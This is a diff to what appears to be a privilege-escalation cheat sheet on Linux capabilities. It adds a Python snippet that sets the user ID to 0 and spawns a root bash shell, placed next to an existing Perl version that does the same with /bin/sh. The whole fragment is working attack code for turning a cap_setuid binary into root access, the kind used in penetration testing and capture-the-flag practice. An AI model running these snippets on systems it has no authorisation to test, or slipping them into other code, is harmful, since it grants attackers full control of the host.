@@ -63,6 +63,12 @@ use POSIX qw(setuid);
 POSIX::setuid(0);
 exec "/bin/sh";
 ```
+- python
+```python
+import os  
+os.setuid(0)  
+os.system('/bin/bash')
+```
 
 ### cap_chown
 - python
